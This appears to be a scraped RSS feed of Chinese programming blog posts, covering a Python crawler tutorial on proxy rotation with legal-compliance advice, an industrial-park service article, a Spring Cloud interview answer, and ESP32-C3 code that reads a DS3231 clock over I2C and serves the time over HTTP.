Safari/537.36'}request=urllib.request.Request(url,headers=headers)# 采用代理,以 key-value 的形式（快代理等网站）proxies={"http":"103.25.36.27:1518"}handler=urllib.request.ProxyHandler(proxies=proxies)opener=urllib.request.build_opener(handler)resource=opener.open(request)html=resource.read().decode('utf-8')withopen('ip.html','w',encoding='utf-8')asf:f.write(html)16、随机选择代理为了进一步提高爬虫的稳定性和隐蔽性，可以随机选择代理服务器。以下是随机选择代理并访问百度查询 IP 的代码：importurllib.requestimporturllib.parseimportrandomproxies=[{"http":"103.215.36.27:15818"},]proxy=random.choice(proxies)print(proxy)url='http://www.baidu.com/s?wd=ip'headers={'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0'}request=urllib.request.Request(url,headers=headers)handler=urllib.request.ProxyHandler(proxies=random.choice(proxies))opener=urllib.request.build_opener(handler)response=opener.open(request)html=response.read().decode('utf-8')# print(html)withopen('ip.html','w',encoding="utf-8")asf:f.write(html)在上述代码中，我们首先定义了一个包含多个代理服务器地址的列表，然后通过random.choice方法随机选择一个代理服务器。接着，按照使用代理服务器的步骤创建Request对象、ProxyHandler对象、opener对象，并发送请求获取响应数据。四、关键要点深入分析合法合规：在进行爬虫开发时，一定要遵守法律法规和网站的使用条款。不得爬取受版权保护的内容、个人隐私信息等敏感数据。例如，一些金融数据、医疗数据等通常受到严格的法律保护，未经授权的爬取可能会面临严重的法律后果。同时，也要注意尊重网站的 robots.txt 文件，这个文件通常规定了哪些页面可以被爬虫访问，哪些不可以。遵守这些规则可以避免与网站所有者产生纠纷。请求频率：不要过于频繁地向服务器发送请求，以免对服务器造成过大的负担，甚至被服务器封禁 IP。一些热门网站可能会有严格的请求频率限制，如果超过这个限制，可能会被视为恶意攻击。可以通过设置随机等待时间、使用代理 IP 等方式来控制请求频率。例如，在每次请求之间随机等待一段时间，这样可以模拟人类的浏览行为，减少被服务器识别为爬虫的可能性。同时，使用代理 IP 可以轮换 IP 地址，避免单个 IP 被封禁。数据解析：选择合适的数据解析方法非常重要。可以根据网页的结构和数据的特点，选择使用正则表达式、XPath、BeautifulSoup 等库来解析数据。正则表达式是一种强大的文本匹配工具，但对于复杂的 HTML 结构，使用正则表达式可能会变得非常复杂和难以维护。XPath 和 BeautifulSoup 则更加适合解析 HTML 和 XML 文档，可以通过简洁的语法快速定位到所需的数据。例如，如果要从一个 HTML 页面中提取所有的链接，可以使用 BeautifulSoup 的find_all('a')方法，非常方便快捷。异常处理：在爬虫开发过程中，可能会遇到各种异常情况，如网络连接失败、页面解析错误等。因此，我们需要进行充分的异常处理，以保证程序的稳定性和可靠性。可以使用 Python 的异常处理机制，如try...except语句，来捕获和处理各种异常。例如，当网络连接失败时，可以捕获urllib.error.URLError异常，并进行相应的处理，如等待一段时间后重新尝试连接。五、Python 爬虫的应用场景数据分析：通过爬取大量的数据，可以进行数据分析和挖掘，发现有价值的信息和趋势。例如，爬取电商网站的商品信息和用户评价，可以进行市场调研和竞品分析。信息监测：可以实时监测特定网站或主题的信息变化，及时获取最新的消息和动态。例如，监测新闻网站的头条新闻，可以及时了解时事热点。学术研究：对于学术研究人员来说，爬虫可以帮助他们收集大量的研究数据，如学术论文、科研成果等。六、总结Python 爬虫是一种非常强大的数据获取工具，但在使用过程中需要注意合法合规、请求频率、数据解析和异常处理等关键要点。只有这样，我们才能充分发挥 Python 爬虫的优势，为我们的数据分析和业务决策提供有力支持。同时，也要不断学习和掌握新的技术和方法，以应对不断变化的网络环境和数据需求。http://www.ppmy.cn/news/1540345.html相关文章湖南（满意度调研）综合性产业园区如何提升企业和创业者获得感？湖南&amp;#xff08;市场调研&amp;#xff09;源点咨询认为&amp;#xff0c;相对于专业性产业园来说&amp;#xff0c;综合性产业园的园区运营工作的覆盖面及运营成本要高很多&amp;#xff0c;运营回报率的时效性也要慢很多。 
而从产业园区运营管理的双重目标约束是公共利益和经济利益最大化&amp;#…阅读更多...Spring Cloud 解决了哪些问题？大家好&amp;#xff0c;我是锋哥。今天分享关于【Spring Cloud 解决了哪些问题&amp;#xff1f;】面试题&amp;#xff1f;希望对大家有帮助&amp;#xff1b; Spring Cloud 解决了哪些问题&amp;#xff1f; 
1000道 互联网大厂Java工程师 精选面试题-Java资源分享网 
Spring Cloud 是一个为构建分布式…阅读更多...esp32-c3 Supermini 驱动ds3121的问题c3 驱动ds3121 ,始终有问题&amp;#xff0c;但把程序用esp32上&amp;#xff0c;一点问题都没有&amp;#xff0c;难道c3 的i2c库是另外的库&amp;#xff0c; 
下图只读取秒显示的 错误数据&amp;#xff0c;更换了scl频率&amp;#xff0c;针脚&amp;#xff0c;还是错&amp;#xff0c;但换成esp32 输出是正确连续秒…阅读更多...代码随想录算法训练营第十一天 | 150.逆波兰表达式求值 239.滑动窗口最大值 347.前 K 个高频元素LeetCode 150.逆波兰表达式求值&amp;#xff1a; 
文章链接 题目链接&amp;#xff1a;150.逆波兰表达式求值 
思路&amp;#xff1a; 
① 使用栈进行运算&amp;#xff0c;遇到操作数入栈&amp;#xff0c;遇到运算符出栈两个元素后入栈 ② 需要注意的是&amp;#xff1a;所给的算式为string类型&amp;#xff0c…阅读更多...Leetcode 字符串解码该代码的算法思想可以分为以下几个步骤&amp;#xff1a; 
1. 使用栈来处理嵌套结构&amp;#xff1a; 
我们需要处理像 k[encoded_string] 这种格式&amp;#xff0c;其中的 encoded_string 可能是嵌套的&amp;#xff0c;即像 3[a2[c]] 这样的输入。因此&amp;#xff0c;我们可以借助 栈&amp;#xff08;S…阅读更多...QJniObject--Qt中的Java交互类QJniObject 
QJniObject 是 Qt for Android 中用于与 Java 代码进行交互的一个类。它提供了一个方便的接口&amp;#xff0c;使得 C 代码可以调用 Java 方法、访问 Java 对象和处理 Java 数据。以下是 QJniObject 的一些主要用途&amp;#xff1a; 
1. 调用 Java 方法 
QJniObject 允许你…阅读更多...闯关leetcode——125. Valid Palindrome大纲 题目地址内容 解题代码地址 题目 
地址 
https://leetcode.com/problems/valid-palindrome/description/ 
内容 
A phrase is a palindrome if, after converting all uppercase letters into lowercase letters and removing all non-alphanumeric characters, it reads …阅读更多...专业学习｜马尔可夫链（概念、变体以及例题）一、马尔可夫链的概念及组成 
&amp;#xff08;一&amp;#xff09;学习资料分享 来源&amp;#xff1a;024-一张图&amp;#xff0c;但讲懂马尔可夫决策过程_哔哩哔哩_bilibili 马尔可夫链提供了一种建模随机过程的方法&amp;#xff0c;具有广泛的应用。在实际问题中&amp;#xff0c;通过转移概率矩阵及初…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:52:47 +0000</pubDate>
    </item>
    <item>
      <title>湖南（满意度调研）综合性产业园区如何提升企业和创业者获得感？</title>
      <link>https://www.ppmy.cn/news/1540344.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维湖南（满意度调研）综合性产业园区如何提升企业和创业者获得感？news/2025/10/31 17:52:46/湖南（市场调研）源点咨询认为，相对于专业性产业园来说，综合性产业园的园区运营工作的覆盖面及运营成本要高很多，运营回报率的时效性也要慢很多。而从产业园区运营管理的双重目标约束是公共利益和经济利益最大化，这就使得综合性产业园在提供园区运营的过程中，不仅要履行政府管理的职能，同时要强调以经营为中心的管理理念，还要体现园区运营服务的特点。对此，做为第三方调研咨询公司角度，我们就以往从各园区满意度测评项目的企业主深度访谈中的感知感触，来从以下几个方面来阐述综合性产业园区如何为企业和创业者提供服务。打造企业服务生态数子化平台从连接、触达、服务、管理4个模块出发，联接企业、园区、机构，跟踪关键信息的触达效果，搭建“一对一”线上服务通道，管理园区内私域流量，以数智化助力园区运营增效、服务增值、创收增新。实现运营数字化，降本增效，保证园企双方的高效信息触达。打造供需共享专属平台---收集并统计触达情况，提升资源利用率和流通率，建立垂直型资源池。搭建园区信息库平台---聚合在线信息流，并统一维护，使服务流程可溯源，以数字化开启全新智能管理模式。通过智能管理模式，园区在降本增效的同时，也保证了高质量的园区服务与客户体验。做好做活企业圈层做企业圈层，不仅仅是把企业圈起来，因为圈起来很容易，毕竟入园之后，双方之间多少还是有点交情，企业家一两次的面子还是要给你的，但如果每次聚在一起只是聊个天、喝个茶，解决不了实际的痛点问题的话，时间长了后，那点面子就用完了。毕竟大家都很忙，而且现在民营企业的生存压力又很大，慢慢的能够派个副总以下的部门主管级人员过来就已经是很给面子了。到那时，这个圈层渐渐也就失去存在的意义了。做企业圈层就做好企业的服务，让企业家、企业高管、企业员工认可园区的服务，愿意为了享受到园区的服务而心甘情愿的付出一定的成本，从而让园区的服务产生价值。服务前置要做好一个园区，前期的定位、策划、招商、运营、服务、资源对接等整个生态系统必须融会贯通，每个环节都是相互促进不可分割的。甚至可以说，园区运营服务是园区某些时候的"救命稻草"。从园区全产业链及建筑物全生命周期的视角去看，园区发展的阶段不同，服务的内容及所体现的价值也是不同的。服务前置，无论是对园区开发公司或是园区运营公司，不仅仅是在增加成本，而是在节省成本增加赢收。首先是进一步的做好了客户关系的维护，让企业对入驻后的发展有一个良好的期盼；其次是减少了“安慰性”服务的成本，为服务增值创建了基础，更主要的是为园区品牌的创建奠下了基石。利用大数据重构产业园区服务在为园区企业提供产业服务的过程中，紧跟智慧园区建设步伐，依托“线上网络平台+线下园区小镇”服务模式，充分发挥大数据在“互联网+”产业服务迭代升级中的驱动作用，用数据流引领技术流、物质流、资金流、人才流，强化统筹衔接和条块结合，实现跨园区、跨区域、跨层级、跨系统的数据交换与共享，构建全流程、全覆盖、全模式、全响应的园区小镇信息化管理与产业服务体系。产业服务大数据的挖掘和利用，是产业服务伴随新技术革新开启，是实现服务迭代升级的必然选择。基于不同服务应用场景，动态采集园区运营、资产管理、企业发展、市场营销、员工消费等方面的最新数据，通过数据挖掘技术，分析各个场景中产业服务用户行为，得到一个多场景下的用户需求全貌，进而建立以用户为中心的新产业服务体系，从而让服务变得更为有效、便捷、准确、优质。在目前国家实行房地产去泡沫、去库存、去杠杆的政策调整打击之下，物业销售、物业租赁等的盈利空间越来越小，园区开发商/运营商的价值体现在介于政府、金融机构、入园企业、入园企业员工等多重对象之间连接的平台作用，运营服务，则是个平台的灵魂。要想实现园区可持续性发展及不断盈利，必须以园区建设为平台，以产业研究为基础，以园区服务为纽带，以产业投资为抓手，提供精细化的服务，才能实现园区绿色健康长远发展，入驻企业获得感与幸福感稳步提升，企业收益闭环。那么此时，第三方调研咨询机构，在这个持续不断的优化过程中，可以承担如下的服务支持：从第三方中立角度上对物业服务中各项因素的重要性评价，服务中各项因素的满意度评价服务偏好等影响因素进行实地调研。根据园区服务开展情况及调研目的，进行定制化调研方案设计，建立多级评估指标体系，对各园区的企业服务进行优势挖掘和问题诊断。寻找出物业服务短板，厘清企业的服务需求，通过词频分析、相关性分析、回归分析、因子分析等多种数据分析法，对测评结果进行科学、准确的论证，为持续完善园区优质服务理念，提供可参考的主观意见诉求分析与客观数据报告支撑。#物业满意度http://www.ppmy.cn/news/1540344.html相关文章Spring Cloud 解决了哪些问题？大家好&amp;#xff0c;我是锋哥。今天分享关于【Spring Cloud 解决了哪些问题&amp;#xff1f;】面试题&amp;#xff1f;希望对大家有帮助&amp;#xff1b; Spring Cloud 解决了哪些问题&amp;#xff1f; 
1000道 互联网大厂Java工程师 精选面试题-Java资源分享网 
Spring Cloud 是一个为构建分布式…阅读更多...esp32-c3 Supermini 驱动ds3121的问题c3 驱动ds3121 ,始终有问题&amp;#xff0c;但把程序用esp32上&amp;#xff0c;一点问题都没有&amp;#xff0c;难道c3 的i2c库是另外的库&amp;#xff0c; 
下图只读取秒显示的 错误数据&amp;#xff0c;更换了scl频率&amp;#xff0c;针脚&amp;#xff0c;还是错&amp;#xff0c;但换成esp32 输出是正确连续秒…阅读更多...代码随想录算法训练营第十一天 | 150.逆波兰表达式求值 239.滑动窗口最大值 347.前 K 个高频元素LeetCode 150.逆波兰表达式求值&amp;#xff1a; 
文章链接 题目链接&amp;#xff1a;150.逆波兰表达式求值 
思路&amp;#xff1a; 
① 使用栈进行运算&amp;#xff0c;遇到操作数入栈&amp;#xff0c;遇到运算符出栈两个元素后入栈 ② 需要注意的是&amp;#xff1a;所给的算式为string类型&amp;#xff0c…阅读更多...Leetcode 字符串解码该代码的算法思想可以分为以下几个步骤&amp;#xff1a; 
1. 使用栈来处理嵌套结构&amp;#xff1a; 
我们需要处理像 k[encoded_string] 这种格式&amp;#xff0c;其中的 encoded_string 可能是嵌套的&amp;#xff0c;即像 3[a2[c]] 这样的输入。因此&amp;#xff0c;我们可以借助 栈&amp;#xff08;S…阅读更多...QJniObject--Qt中的Java交互类QJniObject 
QJniObject 是 Qt for Android 中用于与 Java 代码进行交互的一个类。它提供了一个方便的接口&amp;#xff0c;使得 C 代码可以调用 Java 方法、访问 Java 对象和处理 Java 数据。以下是 QJniObject 的一些主要用途&amp;#xff1a; 
1. 调用 Java 方法 
QJniObject 允许你…阅读更多...闯关leetcode——125. Valid Palindrome大纲 题目地址内容 解题代码地址 题目 
地址 
https://leetcode.com/problems/valid-palindrome/description/ 
内容 
A phrase is a palindrome if, after converting all uppercase letters into lowercase letters and removing all non-alphanumeric characters, it reads …阅读更多...专业学习｜马尔可夫链（概念、变体以及例题）一、马尔可夫链的概念及组成 
&amp;#xff08;一&amp;#xff09;学习资料分享 来源&amp;#xff1a;024-一张图&amp;#xff0c;但讲懂马尔可夫决策过程_哔哩哔哩_bilibili 马尔可夫链提供了一种建模随机过程的方法&amp;#xff0c;具有广泛的应用。在实际问题中&amp;#xff0c;通过转移概率矩阵及初…阅读更多...从零开始学PHP之安装开发环境前言 
不整那些虚的&amp;#xff0c;直接开始上干货&amp;#xff0c;争取让小白也看得懂 
环境选择 
php开发环境一般分为集成环境和编译环境&amp;#xff0c;由于编辑环境费时费力&amp;#xff08;我没搞明白&amp;#xff09;直接使用集成环境&amp;#xff0c;市面上php的集成环境很多我这里用的是phps…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:52:46 +0000</pubDate>
    </item>
    <item>
      <title>Spring Cloud 解决了哪些问题？</title>
      <link>https://www.ppmy.cn/news/1540343.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Spring Cloud 解决了哪些问题？news/2025/10/31 17:52:45/大家好，我是锋哥。今天分享关于【Spring Cloud 解决了哪些问题？】面试题？希望对大家有帮助；Spring Cloud 解决了哪些问题？1000道 互联网大厂Java工程师 精选面试题-Java资源分享网Spring Cloud 是一个为构建分布式系统提供的一系列工具和框架，旨在简化微服务架构的开发与管理。它解决了许多在微服务环境中常见的问题，具体包括以下几个方面：服务发现：问题：在微服务架构中，各个服务可能在不同的机器或容器中运行，如何发现和访问这些服务成为一个重要问题。解决方案：Spring Cloud 提供了 Eureka、Consul 和 Zookeeper 等服务发现组件，允许服务实例在启动时自动注册并让其他服务能够方便地查询到这些实例。负载均衡：问题：当有多个服务实例可供请求时，如何高效地分配请求以避免某一实例过载。解决方案：Spring Cloud Ribbon 和 Spring Cloud LoadBalancer 提供客户端负载均衡的功能，可以根据一定的策略（如轮询、随机等）将请求分发到不同的服务实例上。API 网关：问题：在微服务架构中，客户端需要访问多个服务，直接与各个服务交互会增加复杂性。解决方案：Spring Cloud Gateway 提供了一个统一的 API 网关，可以集中处理请求路由、负载均衡、安全、监控等功能，从而简化客户端与服务之间的交互。配置管理：问题：在分布式系统中，管理各个服务的配置文件是一项挑战。解决方案：Spring Cloud Config 提供集中化的配置管理服务，允许服务从中央配置服务器获取其配置，支持动态刷新和版本控制。断路器模式：问题：当一个服务不可用时，如何避免 cascading failure 的问题，确保系统的稳定性。解决方案：Spring Cloud Netflix Hystrix 提供了断路器功能，能够监测服务调用的健康状态，并在服务不可用时快速失败，防止进一步的请求造成系统崩溃。消息总线：问题：在微服务之间进行通信和数据共享时，需要一种可靠的消息传递机制。解决方案：Spring Cloud Stream 和 Spring Cloud Bus 提供了基于消息中间件的异步通信机制，支持事件驱动架构和服务间的消息传递。安全管理：问题：在微服务架构中，如何保护服务之间的通信以及外部请求。解决方案：Spring Cloud Security 提供了整合 Spring Security 的解决方案，支持 OAuth2、JWT 等认证和授权机制，确保服务的安全性。监控与追踪：问题：在分布式环境中，如何有效地监控服务的健康状况和性能。解决方案：Spring Cloud Sleuth 和 Spring Boot Admin 提供了服务追踪和监控的功能，可以收集和分析服务的调用链和性能指标，帮助开发者排查问题。容错管理：问题：当某个服务出现故障时，如何处理请求以避免影响用户体验。解决方案：结合断路器模式和重试机制，Spring Cloud 提供了应对网络延迟和服务不可用的策略，以提高系统的鲁棒性。通过这些解决方案，Spring Cloud 为构建、部署和管理微服务架构提供了强有力的支持，使开发者能够专注于业务逻辑而不是基础设施问题。http://www.ppmy.cn/news/1540343.html相关文章esp32-c3 Supermini 驱动ds3121的问题c3 驱动ds3121 ,始终有问题&amp;#xff0c;但把程序用esp32上&amp;#xff0c;一点问题都没有&amp;#xff0c;难道c3 的i2c库是另外的库&amp;#xff0c; 
下图只读取秒显示的 错误数据&amp;#xff0c;更换了scl频率&amp;#xff0c;针脚&amp;#xff0c;还是错&amp;#xff0c;但换成esp32 输出是正确连续秒…阅读更多...代码随想录算法训练营第十一天 | 150.逆波兰表达式求值 239.滑动窗口最大值 347.前 K 个高频元素LeetCode 150.逆波兰表达式求值&amp;#xff1a; 
文章链接 题目链接&amp;#xff1a;150.逆波兰表达式求值 
思路&amp;#xff1a; 
① 使用栈进行运算&amp;#xff0c;遇到操作数入栈&amp;#xff0c;遇到运算符出栈两个元素后入栈 ② 需要注意的是&amp;#xff1a;所给的算式为string类型&amp;#xff0c…阅读更多...Leetcode 字符串解码该代码的算法思想可以分为以下几个步骤&amp;#xff1a; 
1. 使用栈来处理嵌套结构&amp;#xff1a; 
我们需要处理像 k[encoded_string] 这种格式&amp;#xff0c;其中的 encoded_string 可能是嵌套的&amp;#xff0c;即像 3[a2[c]] 这样的输入。因此&amp;#xff0c;我们可以借助 栈&amp;#xff08;S…阅读更多...QJniObject--Qt中的Java交互类QJniObject 
QJniObject 是 Qt for Android 中用于与 Java 代码进行交互的一个类。它提供了一个方便的接口&amp;#xff0c;使得 C 代码可以调用 Java 方法、访问 Java 对象和处理 Java 数据。以下是 QJniObject 的一些主要用途&amp;#xff1a; 
1. 调用 Java 方法 
QJniObject 允许你…阅读更多...闯关leetcode——125. Valid Palindrome大纲 题目地址内容 解题代码地址 题目 
地址 
https://leetcode.com/problems/valid-palindrome/description/ 
内容 
A phrase is a palindrome if, after converting all uppercase letters into lowercase letters and removing all non-alphanumeric characters, it reads …阅读更多...专业学习｜马尔可夫链（概念、变体以及例题）一、马尔可夫链的概念及组成 
&amp;#xff08;一&amp;#xff09;学习资料分享 来源&amp;#xff1a;024-一张图&amp;#xff0c;但讲懂马尔可夫决策过程_哔哩哔哩_bilibili 马尔可夫链提供了一种建模随机过程的方法&amp;#xff0c;具有广泛的应用。在实际问题中&amp;#xff0c;通过转移概率矩阵及初…阅读更多...从零开始学PHP之安装开发环境前言 
不整那些虚的&amp;#xff0c;直接开始上干货&amp;#xff0c;争取让小白也看得懂 
环境选择 
php开发环境一般分为集成环境和编译环境&amp;#xff0c;由于编辑环境费时费力&amp;#xff08;我没搞明白&amp;#xff09;直接使用集成环境&amp;#xff0c;市面上php的集成环境很多我这里用的是phps…阅读更多...leetcode计数排序计数排序&amp;#xff08;counting sort&amp;#xff09;通过统计元素数量来实现排序&amp;#xff0c;通常应用于整数数组。 给定一个长度为 的数组 nums &amp;#xff0c;其中的元素都是“非负整数” def counting_sort(nums: list[int]):"""计数排序"""# 完整实…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:52:45 +0000</pubDate>
    </item>
    <item>
      <title>esp32-c3 Supermini 驱动ds3121的问题</title>
      <link>https://www.ppmy.cn/news/1540342.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维esp32-c3 Supermini 驱动ds3121的问题news/2025/10/31 17:52:44/c3 驱动ds3121 ,始终有问题，但把程序用esp32上，一点问题都没有，难道c3 的i2c库是另外的库，下图只读取秒显示的 错误数据，更换了scl频率，针脚，还是错，但换成esp32 输出是正确连续秒数。折腾了一天，没有发现问题在查错中发现一个问题，如果idf抱错显示jbk编码问题，有可能是数据线松动重插一下就排除了，这个现象很奇怪。图片代码#include &lt;string.h&gt;
#include "freertos/FreeRTOS.h"#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "nvs_flash.h"
#include "esp_http_server.h"
#include "esp_timer.h"// WiFi 
#define WIFI_SSID "ChinaNet-AETP5V"
#define WIFI_PASS "wf123456"//=================================#include "driver/gpio.h"#include "freertos/task.h"
#include "string.h"
#include "driver/i2c.h"#include "sdkconfig.h"
#include &lt;stdio.h&gt;
#include "esp_system.h"
#include "esp_log.h"#define I2C_MASTER_SCL_IO           20
#define I2C_MASTER_SDA_IO           21
#define I2C_MASTER_NUM              I2C_NUM_0
#define I2C_MASTER_FREQ_HZ          100000
#define I2C_MASTER_TX_BUF_DISABLE   0
#define I2C_MASTER_RX_BUF_DISABLE   0
#define DS3231_ADDRESS              0x68  // 68// I2C 初始化
void i2c_master_init() {i2c_config_t conf = {.mode = I2C_MODE_MASTER,.sda_io_num = I2C_MASTER_SDA_IO,.scl_io_num = I2C_MASTER_SCL_IO,.sda_pullup_en = GPIO_PULLUP_ENABLE,.scl_pullup_en = GPIO_PULLUP_ENABLE,.master.clk_speed = I2C_MASTER_FREQ_HZ,};ESP_ERROR_CHECK(i2c_param_config(I2C_MASTER_NUM, &amp;conf));ESP_ERROR_CHECK(i2c_driver_install(I2C_MASTER_NUM, conf.mode, I2C_MASTER_RX_BUF_DISABLE, I2C_MASTER_TX_BUF_DISABLE, 0));
}
//==========================static EventGroupHandle_t s_wifi_event_group;
static const int WIFI_CONNECTED_BIT = BIT0;
static const char *TAG = "WiFi_HTTP";
static  uint64_t n;
// 
static void event_handler(void* arg, esp_event_base_t event_base, int32_t event_id, void* event_data) {if (event_base == WIFI_EVENT &amp;&amp; event_id == WIFI_EVENT_STA_START) {esp_wifi_connect();  // } else if (event_base == WIFI_EVENT &amp;&amp; event_id == WIFI_EVENT_STA_DISCONNECTED) {esp_wifi_connect();  // ESP_LOGI(TAG, "...");} else if (event_base == IP_EVENT &amp;&amp; event_id == IP_EVENT_STA_GOT_IP) {ip_event_got_ip_t* event = (ip_event_got_ip_t*) event_data;ESP_LOGI(TAG, "IP: " IPSTR, IP2STR(&amp;event-&gt;ip_info.ip));xEventGroupSetBits(s_wifi_event_group, WIFI_CONNECTED_BIT);  // λ}
}// WiFi 
void wifi_init_sta(void) {s_wifi_event_group = xEventGroupCreate();  // //  NVSesp_err_t ret = nvs_flash_init();if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {ESP_ERROR_CHECK(nvs_flash_erase());ret = nvs_flash_init();}ESP_ERROR_CHECK(ret);//  WiFiESP_ERROR_CHECK(esp_netif_init());ESP_ERROR_CHECK(esp_event_loop_create_default());esp_netif_create_default_wifi_sta();wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();ESP_ERROR_CHECK(esp_wifi_init(&amp;cfg));ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &amp;event_handler, NULL, NULL));ESP_ERROR_CHECK(esp_event_handler_instance_register(IP_EVENT, IP_EVENT_STA_GOT_IP, &amp;event_handler, NULL, NULL));//  WiFi wifi_config_t wifi_config = {.sta = {.ssid = WIFI_SSID,.password = WIFI_PASS,},};ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));  // ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_STA, &amp;wifi_config));ESP_ERROR_CHECK(esp_wifi_start());  //  WiFiESP_LOGI(TAG, "WiFi ");
}// 浏览器向esp32 GET信息
esp_err_t hello_get_handler(httpd_req_t *req) {//   ESP_LOGI(TAG, "Requested URI: %s", req-&gt;uri);     //显示浏览器向esp32 http server 发送的信息   可以把uri的信息提取出来 控制esp32 如uri中有ds3231  则esp32控制ds3231//  ESP_LOGI(TAG, "Requested Method: %s", http_method_str(req-&gt;method));
//    ESP_LOGI(TAG, "Requested URI: %d", req-&gt;content_len);//   n=esp_timer_get_time();   //esp32 从开机到运行此命令的时间（微秒）i2c_cmd_handle_t cmd;uint8_t data[3]={0,0,0};uint8_t o;uint8_t om;uint8_t omh;uint8_t oml;cmd = i2c_cmd_link_create();i2c_master_start(cmd);	 i2c_master_write_byte(cmd, (DS3231_ADDRESS &lt;&lt; 1) | I2C_MASTER_WRITE, true);i2c_master_write_byte(cmd, 0x00, true);i2c_master_start(cmd);i2c_master_write_byte(cmd, (DS3231_ADDRESS &lt;&lt; 1) | I2C_MASTER_READ, true);i2c_master_read(cmd, data, 3, I2C_MASTER_ACK);i2c_master_stop(cmd);esp_err_t ret = i2c_master_cmd_begin(I2C_MASTER_NUM, cmd, 1000 / portTICK_PERIOD_MS);i2c_cmd_link_delete(cmd);om=data[0];omh=(om&gt;&gt;4)&amp;0b00001111;oml=om&amp;0b00001111;o=omh*10+oml;printf("%d\n",o);char resp_str[21]; // uint64_t 的最大长度是 20 位，加上结尾的 null 字符sprintf(resp_str, "%u", o); //  snprintf(resp_str, sizeof(resp_str), "%llu", n);    // 使用 snprintf 将 uint64_t 转换为字符串httpd_resp_set_hdr(req, "Access-Control-Allow-Origin", "*"); // 允许所有来源，此条非常重要httpd_resp_set_type(req, "text/plain");httpd_resp_send(req, resp_str, HTTPD_RESP_USE_STRLEN);      //esp32 向浏览器发送return ESP_OK;
}//  URI 
httpd_uri_t hello = {.uri = "/time",.method = HTTP_GET,.handler = hello_get_handler,.user_ctx = NULL 
};//  HTTP 
static httpd_handle_t start_webserver(void) {httpd_config_t config = HTTPD_DEFAULT_CONFIG();httpd_handle_t server = NULL;if (httpd_start(&amp;server, &amp;config) == ESP_OK) {httpd_register_uri_handler(server, &amp;hello);  // }return server;
